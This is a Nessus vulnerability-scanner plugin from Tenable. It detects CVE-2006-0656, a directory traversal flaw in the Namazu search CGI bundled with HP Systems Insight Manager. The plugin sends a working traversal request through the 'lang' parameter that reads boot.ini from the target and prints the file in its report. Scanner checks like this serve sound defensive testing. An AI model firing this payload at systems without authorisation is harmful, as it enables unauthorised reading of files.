#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a CGI script that is affected by an
directory traversal flaw. 

Description :

The remote host appears to be running HP Systems Insight Manager
(SIM), a unified infrastructure management tool. 

The version of HP SIM on the remote host includes a version of the
search engine Namazu that reportedly fails to validate user input to
the 'lang' parameter of the 'namazucgi' script.  An unauthenticated
attacker may be able to exploit this issue to access files on the
remote host via directory traversal. 

See also :

http://www.securityfocus.com/advisories/10104

Solution :

Update HP SIM's .namazurc configuration file according to the vendor
advisory. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(20893);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-0656");
  script_bugtraq_id(16571);

  script_name(english:"HP Systems Insight Manager Namazu lang Directory Traversal Vulnerability");
  script_summary(english:"Checks for Namazu lang parameter directory traversal vulnerability in HP Systems Insight Manager");
 
  script_description(english:desc);

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 50000, 50001);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:50000);
if (!get_port_state(port)) exit(0);


# Try to exploit the flaw to read a file.
file = "/../../../../../../../../../../../../../boot.ini";
req = http_get(
  item:string(
    "/mxhelp/cgi-bin/namazucgi?",
    "lang=", file
  ),
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);

# There's a problem if looks like boot.ini.
if ("[boot loader]">< res) {
  contents = res - strstr(res, "<h2>Results:");

  if (isnull(contents)) report = desc;
  else {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '\\boot.ini' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      contents
    );
  }

  security_note(port:port, data:report);
}
